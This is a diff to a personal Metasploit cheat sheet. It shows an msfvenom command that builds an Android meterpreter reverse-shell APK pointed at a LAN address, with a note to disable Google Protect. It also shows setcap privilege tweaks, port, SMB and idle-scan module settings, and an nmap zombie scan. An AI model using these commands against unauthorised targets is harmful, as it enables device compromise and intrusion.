@@ -14,6 +14,11 @@ wlan.fc.type_subtype == 12
 
 ### MSF 101  
 
+snap connect metasploit-framework:network-control :network-control  
+(do the following or run msf with "sudo -i")
+/usr/sbin/setcap cap_net_raw,cap_net_bind_service=+eip $(which ruby)
+/usr/sbin/setcap cap_net_raw,cap_net_bind_service=+eip $(which nmap)
+  
 msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.110.126 LPORT=4444 -o android_client.apk  
   
 disable Google Protect  
@@ -88,3 +93,26 @@ db_import ~/nmap_scans/*.xml
 use mysql_login  
 hosts  
 hosts -S Linux -R  
+
+### Scanning tools  
+
+ - auxiliary/scanner/portscan/tcp
+hosts -R  
+
+ - auxiliary/scanner/portscan/syn
+set INTERFACE wlan1  
+set PORTS 80  
+set RHOSTS 192.168.1.0/24  
+set THREADS 50  
+
+ - auxiliary/scanner/smb/smb_version
+set RHOSTS 192.168.1.200-210  
+set THREADS 11  
+
+ - auxiliary/scanner/ip/ipidseq  
+(idle scan with zombies)  
+set RHOSTS 192.168.1.0/24  
+set THREADS 50  
+(using zombie to scan host #109 -> #114)  
+nmap -Pn -sI 192.168.1.109 192.168.1.114  
+
